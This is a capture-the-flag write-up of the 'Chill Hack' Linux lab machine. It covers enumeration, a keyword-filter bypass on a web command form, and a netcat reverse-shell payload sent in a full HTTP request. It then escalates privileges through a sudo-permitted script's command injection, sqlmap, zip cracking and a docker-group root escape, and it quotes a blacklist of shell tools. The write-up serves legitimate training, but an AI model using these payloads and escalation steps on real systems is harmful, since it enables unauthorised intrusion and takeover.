# Writeup: Chill Hack

**OS**: 🐧 Linux

**Level**: 🟢 Easy

## 🔎 Enumeration:

Nmap scan:

```shell
nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan $TARGET
```

Result:

```
# Nmap 7.95 scan initiated Sat Nov 29 02:58:39 2025 as: /usr/lib/nmap/nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan 10.80.172.108
Nmap scan report for 10.80.172.108
Host is up, received user-set (0.051s latency).
Scanned at 2025-11-29 02:58:40 EST for 44s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.146.29
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6d:e2:87:8a:c4:94:9a:d2:fd:f8:a9:ef:4c:67:86:1c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8fy/IX01cvAa7m4FvnYNbl2p6YnRz8JbA5vvkHpD278L8wz50+kPfFT1gBLR0XuZIovjAekvmTzqL0sS6iSD60mYLru1R9QNCfy0f04V08VPDbcUzNpciEpGGFqmidtNq7MkPZPRU8/0dydMiBsxzq7MwT5wZe8zxDKB3ZE7kYmm5H1mlYfibHPG7ytUsOBh+mfXWM4A0CmBlWgpHONLXXSEgR6bvJ/jYxma/OBu/UIUK/J/01/wcKpfoQEESvhg+uWu2XSP+wXJEirTLQQfbeQu1fLiCdgu3TtB3EI/i6B+5e7OvvZG2I1bLqhjA5inLLvVwwffXAo/rbNln16HQU0eulMEcG6Po7uJM/MkQ5qam1O/wn/ntDXoeck/amk+1+ee/ALgYNgwVICzJoT8x2V6VcaKmJLRLleYO081uhtXeITbgGBAIJqEfTG6ZDkwaUAOR0IC1h+Ry859AaKSpOQj0I7xrOwy/ulhwqxhxr47w1vZjGussjEVGkFZX2OU=
|   256 a6:fc:a5:59:8a:00:86:80:31:f0:ba:e1:58:96:18:e5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMNwNP0GHmVweJdFUjbeQATOD5MJT2I5aW9S5TjfUf+HJvYphiOiEtm5P2h+ul2f4Hn3GHYCt05lxinjsVD4+Go=
|   256 23:58:5d:4f:32:0d:6a:87:c1:fb:ec:36:c3:eb:e0:68 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINZP/xLAOhQuhVOkrXtGuoodFBEEolgh+A1TE6TXccLB
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Game Info
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-favicon: Unknown favicon MD5: 7EEEA719D1DF55D478C68D9886707F17
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov 29 02:59:24 2025 -- 1 IP address (1 host up) scanned in 44.99 seconds
```

On port 21 i found a vsftpd server running with anonymous login allowed, so i logged in an downloaded the `notes.txt` file.

```
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

On port 80 i found a apache webserver running, so i have done a directory bruteforce with `gobuster`.

```shell
gobuster dir -u http://10.80.172.108 -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -t 50 -x php -o gobuster_scan
```

```
/images               (Status: 301) [Size: 315] [--> http://10.80.172.108/images/]
/contact.php          (Status: 200) [Size: 0]
/fonts                (Status: 301) [Size: 314] [--> http://10.80.172.108/fonts/]
/css                  (Status: 301) [Size: 312] [--> http://10.80.172.108/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.80.172.108/js/]
/secret               (Status: 301) [Size: 315] [--> http://10.80.172.108/secret/]
/server-status        (Status: 403) [Size: 278]
```

I found a formfield to execute system commands under `/secret` so i tried `cat /etc/passwd` but the command was filtered, but `tac /etc/passwd | grep 'sh'` did work an has revealed the users on the target machine.

```
ubuntu:x:1003:1004:Ubuntu:/home/ubuntu:/bin/bash
fwupd-refresh:x:117:121:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
anurodh:x:1002:1002:,,,:/home/anurodh:/bin/bash
apaar:x:1001:1001:,,,:/home/apaar:/bin/bash
aurick:x:1000:1000:Anurodh:/home/aurick:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
root:x:0:0:root:/root:/bin/bash
```

Since `tac` is working i was able to extract the content of `index.php` in reverse and find out which words are filtered.

```php
...
for($i=0; $i<count($store); $i++)
$blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');
$store = explode(" ",$cmd);
$cmd = $_POST['command'];
...
```

## 💥 Exploitation:

Adding a backslash in the filtered commands (`ca\t`) did work also, so i was able to get a shell as user `www-data` with this modified revshell command as the payload `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f`.

```http
POST /secret/ HTTP/1.1
Host: 10.80.172.108
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 99
Origin: http://10.80.172.108
Connection: keep-alive
Referer: http://10.80.172.108/secret/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

command=r\m+/tmp/f%3bmkfifo+/tmp/f%3bca\t+/tmp/f|/bin/s\h+-i+2>%261|n\c+10.10.10.10+4444+>/tmp/f
```

## 🔓 Priviledge Escalation:

`sudo -l` has revealed that i can execute `.helpline.sh` which is vulnerable top command injection as user `apaar` so i was able to get a shell and read the `local.txt` flag inside of his home directory.

```
Matching Defaults entries for www-data on ip-10-80-172-108:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-80-172-108:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

```bash
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

```
sudo -u apaar /home/apaar/.helpline.sh


Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: /bin/bash
Hello user! I am /bin/bash,  Please enter your message: /bin/bash
id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
```

I found port `9001` open on localhost running a webservice so to be able to acces it from my machine i had to add a ssh key to the `authorized_keys` files and open a ssh tunnel with reverse port forwarding.

```
ssh -L 9001:127.0.0.1:9001 -i chillhack apaar@10.80.172.108
```

I found a login form. Using `sqlmap` i extracted some credentials and was able to login to the webpage.

```
+----+----------+----------------------------------+-----------+-----------+
| id | lastname | password                         | username  | firstname |
+----+----------+----------------------------------+-----------+-----------+
| 1  | Acharya  | 7e53614ced3640d5de23f1********** | Aurick    | Anurodh   |
| 2  | Dahal    | 686216240e5af30df0501e********** | cullapaar | Apaar     |
+----+----------+----------------------------------+-----------+-----------+
```

After login i downloaded the `hacker-with-laptop_23-2147985341.jpg` on my machine and i have used `steghide` to extract the password protected `backup.zip.`

```
steghide extract -sf hacker-with-laptop_23-2147985341.jpg
```

I used `john` to crack the password and extract the `source_code.php`.

```
zip2john backup.zip > backup.zip.hash

john --wordlist=/usr/share/wordlists/rockyou.txt backup.zip.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pas******        (backup.zip/source_code.php)     
1g 0:00:00:00 DONE (2025-11-29 04:48) 4.545g/s 55854p/s 55854c/s 55854C/s total90..hawkeye
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Inside of `source_code.php` i found the base64 encoded password for the user `anurodh` which is `!d0ntKn0w**********`

I logged in to the target machine as user `anurodh` and found this user being part of the docker group, which i was able to exploit and to escalate my privs to `root` and finally read the flag `proof.txt`.

```shell
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## 💰 Loot:

```shell
# local.txt
{USER-FLAG: e8vpd3323cfvlp0qpxxx9q**********}

# proof.txt
{ROOT-FLAG: w18gfpn9xehsgd3tovhk0h**********}
```